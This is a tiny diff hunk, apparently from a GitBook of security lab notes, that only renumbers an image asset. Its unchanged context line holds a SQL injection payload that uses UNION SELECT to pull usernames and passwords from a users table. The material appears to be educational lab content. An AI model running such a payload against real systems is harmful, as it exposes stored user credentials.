@@ -13,5 +13,5 @@
 '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
 ```
 
-![](../../../.gitbook/assets/imagen%20%28651%29.png)
+![](../../../.gitbook/assets/imagen%20%28652%29.png)
 
